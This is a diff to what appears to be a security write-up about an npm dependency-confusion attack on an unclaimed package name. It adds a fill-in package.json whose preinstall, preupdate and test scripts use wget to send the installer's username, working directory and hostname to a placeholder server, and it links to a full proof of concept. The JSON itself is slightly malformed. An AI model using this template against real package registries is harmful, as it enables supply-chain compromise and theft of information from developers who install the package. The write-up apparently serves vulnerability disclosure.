@@ -20,6 +20,25 @@ The vulnerable package was unclaimed on NPM 👀
 
 ```
 
+package.json
+
+```
+{
+  "name": "====>Replace This wite The Package NAME",
+  "version": "10.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "wget --quiet http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
+    "preinstall": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
+    "preupdate": "wget --quiet \"http://YourServer/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" "
+  },
+  "author": "orwa",
+  "license": "ISC"
+  }
+}
+```
+
 After claiming the package, he injected an RCE payload via package.json
 🧪 Full POC: [https://github.com/orwagodfather/NPM-RCE](https://github.com/orwagodfather/NPM-RCE)
 
